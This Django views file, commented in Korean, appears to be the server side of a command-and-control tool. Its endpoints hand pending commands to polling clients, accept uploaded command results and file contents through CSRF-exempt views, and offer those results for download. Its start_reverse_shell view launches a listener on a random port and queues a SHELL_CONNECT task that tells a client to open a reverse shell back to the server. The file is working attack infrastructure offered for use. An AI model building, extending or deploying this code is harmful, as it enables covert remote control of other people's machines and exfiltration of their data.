import json
from django.shortcuts import get_object_or_404
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse, HttpResponse
from django.db.models import Q
from django.urls import reverse
from django.utils import timezone
import random
import socket
import subprocess
import sys
import os


from .models import CommandTask, Client

# Windows에서 CREATE_NEW_CONSOLE 플래그 사용을 위해 필요한 상수 (표준 라이브러리에 정의됨)
if os.name == 'nt':
    from subprocess import CREATE_NEW_CONSOLE
    # CREATE_NEW_CONSOLE = 0x00000010

@csrf_exempt
def poll_command_view(request):
    """
    클라이언트로부터 폴링 요청을 받아, 대기 중인 명령을 할당하거나 빈 응답을 반환합니다.
    """
    client_id = request.GET.get('client_id')

    if not client_id:
        return JsonResponse({"status": "error", "message": "Client ID missing"}, status=400)

    # Client 모델 생성 또는 last_seen 업데이트
    client, created = Client.objects.update_or_create(
        client_id=client_id,
        defaults={'client_id': client_id}
    )
    
    try:
        command = CommandTask.objects.filter(
            Q(client__isnull=True) | Q(client=client)
        ).filter(status='PENDING').order_by('created_at').first()

    except Exception as e:
        print(f"[CRITICAL ERROR in poll_command_view] {e}")
        return JsonResponse({"status": "error", "message": "Internal Server Error during query"}, status=500)


    if command:
        command.status = 'ASSIGNED'
        
        if command.client is None:
              command.client = client
              
        command.save()

        # command.payload가 이미 딕셔너리일 수도 있고 (JSONField), 
        # 문자열일 수도 있습니다 (CharField). 두 경우 모두 처리합니다.
        try:
            if isinstance(command.payload, dict):
                # 이미 딕셔너리(JSONField 사용 시)인 경우 그대로 사용
                parsed_payload = command.payload
            elif isinstance(command.payload, str):
                # 문자열인 경우 (CharField 사용 시) 파싱을 시도
                parsed_payload = json.loads(command.payload)
            else:
                # 기타 타입의 경우 (예외 상황)
                parsed_payload = str(command.payload)
        except (TypeError, json.JSONDecodeError) as e:
            print(f"[PAYLOAD PARSING ERROR] Task ID {command.id}: {e}")
            parsed_payload = command.payload # 오류 발생 시 원본 데이터를 그대로 사용
        
        response_data = {
            "status": "command_assigned",
            "command_id": command.id,
            "command_name": command.command_name,
            "client_id": client.client_id,
            "payload": parsed_payload 
        }
        print(f"[INFO] 명령 할당: Task ID {command.id} to {client_id}")
        return JsonResponse(response_data)
    else:
        return JsonResponse({"status": "no_command", "message": "No pending commands."})

@csrf_exempt
def receive_upload_view(request):
    """
    클라이언트가 명령 실행 결과를 JSON으로 POST하는 것을 받습니다.
    """
    if request.method != 'POST':
        return JsonResponse({"status": "error", "message": "Only POST requests allowed"}, status=405)

    try:
        data = json.loads(request.body)
        
        command_id = data.get('command_id')
        status = data.get('status')
        exit_code = data.get('exit_code')
        filename = data.get('filename')
        file_content = data.get('file_content')

        task = get_object_or_404(CommandTask, id=command_id)

        # 결과 업데이트
        task.status = status
        task.exit_code = exit_code
        task.result_filename = filename
        task.result_content = file_content
        task.save()
        
        print(f"[INFO] Task ID {command_id} 결과 수신. 상태: {status}, 파일: {filename}")
        
        return JsonResponse({"status": "success", "message": "Result uploaded successfully."})

    except CommandTask.DoesNotExist:
        return JsonResponse({"status": "error", "message": "CommandTask not found"}, status=404)
    except json.JSONDecodeError:
        return JsonResponse({"status": "error", "message": "Invalid JSON"}, status=400)
    except Exception as e:
        print(f"[CRITICAL ERROR in receive_upload_view] {e}")
        return JsonResponse({"status": "error", "message": "Internal Server Error"}, status=500)


def download_result_view(request, task_id):
    """
    관리자 페이지에서 명령 실행 결과를 다운로드할 수 있도록 파일을 제공합니다.
    """
    task = get_object_or_404(CommandTask, id=task_id)

    if not task.result_content:
        # 내용이 없는 경우 404 또는 메시지 반환
        return HttpResponse("명령 결과 내용이 없습니다.", status=404)

    # 응답 생성
    response = HttpResponse(task.result_content, content_type='application/octet-stream')

    # 파일 다운로드를 위한 헤더 설정
    filename = task.result_filename if task.result_filename else f"task_result_{task_id}.txt"
    response['Content-Disposition'] = f'attachment; filename="{filename}"'
    
    return response
    
# 리스너 포트 범위 (listen_for_shell.py와 동기화됨)
MIN_PORT = 10000
MAX_PORT = 10100

def start_reverse_shell(request, client_id):
    # 1. 클라이언트 존재 확인
    try:
        client = Client.objects.get(client_id=client_id)
    except Client.DoesNotExist:
        return HttpResponse("클라이언트 ID를 찾을 수 없습니다.", status=404)

    # 2. 서버가 들을 포트(Listening Port) 결정
    LISTEN_PORT = random.randint(MIN_PORT, MAX_PORT)
    
    server_ip = request.META.get('HTTP_HOST', '192.168.30.129').split(':')[0]
    if server_ip in ('127.0.0.1', 'localhost', '0.0.0.0'):
        # 실제 환경 IP로 대체 필요 
        server_ip = '192.168.30.129' 

    listener_status = "리스너 실행 준비 완료."

    try:
        if os.name == 'nt':
            # 🚨 윈도우 환경 수정: CREATE_NEW_CONSOLE 플래그를 사용하여 새 콘솔 창 생성
            command = [
                sys.executable, 
                'manage.py', 
                'listen_for_shell', 
                '--port', 
                str(LISTEN_PORT)
            ]
            
            # CREATE_NEW_CONSOLE 플래그를 사용하여 새로운 콘솔 창에서 프로세스를 시작합니다.
            subprocess.Popen(
                command,
                creationflags=CREATE_NEW_CONSOLE
            )
            
            listener_status = f"새 콘솔 창이 열리고 포트 {LISTEN_PORT}에서 리스너가 실행되었습니다."
            
        else:
            # Linux/macOS 환경: 백그라운드 실행 유지
            command = [
                sys.executable, 
                'manage.py', 
                'listen_for_shell', 
                '--port', 
                str(LISTEN_PORT)
            ]

            subprocess.Popen(
                command,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True 
            )
            listener_status = f"백그라운드 리스너가 포트 {LISTEN_PORT}에서 실행되었습니다. (새 창 없음)"


        print(f"[PROCESS] 리스너 실행 완료: 포트 {LISTEN_PORT}")

    except Exception as e:
        listener_status = f"리스너 실행 실패: {e}"
        print(f"[ERROR] 리스너 실행 실패: {e}")
        
    # 4. 클라이언트에게 보낼 CommandTask 생성
    command_name = "SHELL_CONNECT" 
    
    payload = {
        "ip": server_ip,
        "port": LISTEN_PORT
    }

    # 딕셔너리 객체 자체를 저장 (이중 인코딩 방지)
    task = CommandTask.objects.create(
        client=client,
        command_name=command_name,
        payload=payload, 
        status='PENDING',
        created_at=timezone.now()
    )
    
    # 5. 관리자에게 상태 메시지 출력 및 리다이렉트 준비
    message = (
        f"리버스 셸 명령(Task #{task.id})이 **{client_id}**에게 할당되었습니다. <br>"
        f"클라이언트에게 **{payload['ip']}:{LISTEN_PORT}**로 연결하라는 명령이 전송되었습니다. <br>"
        f"**리스너 상태:** {listener_status}"
    )
    
    admin_url = reverse('admin:tasks_commandtask_change', args=[task.id])
    
    return HttpResponse(message + f'<br><br><a href="{admin_url}">할당된 Task 보기</a>', status=200)